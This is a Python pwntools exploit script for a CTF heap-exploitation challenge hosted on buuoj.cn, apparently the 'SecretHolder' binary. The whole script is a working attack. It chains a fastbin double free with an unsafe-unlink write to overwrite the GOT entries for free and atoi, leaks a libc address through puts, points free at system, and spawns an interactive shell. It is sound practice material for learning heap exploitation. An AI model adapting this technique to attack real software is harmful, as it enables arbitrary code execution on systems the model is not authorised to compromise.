from pwn import *
#p=process('./1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
p=remote('node3.buuoj.cn',29336)
libc=ELF('libc-2.23_64.so')
elf=ELF('1')
context.terminal = ['tmux','splitw','-h']
free_got=elf.got['free']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
atoi_got=elf.got['atoi']
small_buf_addr=0x6020D0
def debug():
    gdb.attach(p)
    pause()
def add(x,con):
    p.recvuntil('3. Renew secret')
    p.sendline('1')
    p.recvuntil('What secret do you want to keep?')
    p.sendline(str(x))
    p.recvuntil('Tell me your secret: ')
    p.send(str(con))
def delete(x):
    p.recvuntil('3. Renew secret')
    p.sendline('2')
    p.recvuntil('2. Big secret')
    p.sendline(str(x))
def edit(x,con):
    p.recvuntil('3. Renew secret')
    p.sendline('3')
    p.recvuntil('Which Secret do you want to renew?')
    p.sendline(str(x))
    p.recvuntil('Tell me your secret:')
    p.send(str(con))
add(1,'aaaa')
add(2,'bbbb')
delete(1)
add(3,'cccc')
delete(1)
payload=p64(0)+p64(0x21)
payload+=p64(small_buf_addr-0x18)+p64(small_buf_addr-0x10)
payload+=p64(0x20)
add(1,payload)
delete(2)
payload=p64(0)+p64(atoi_got)+p64(puts_got)+p64(free_got)+p32(1)*3
edit(1,payload)
edit(1,p64(puts_plt))
delete(2)
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['atoi']
print hex(libc.address)

edit(1,p64(libc.sym['system']))
add(2,'/bin/sh\x00')
delete(2)
p.interactive()
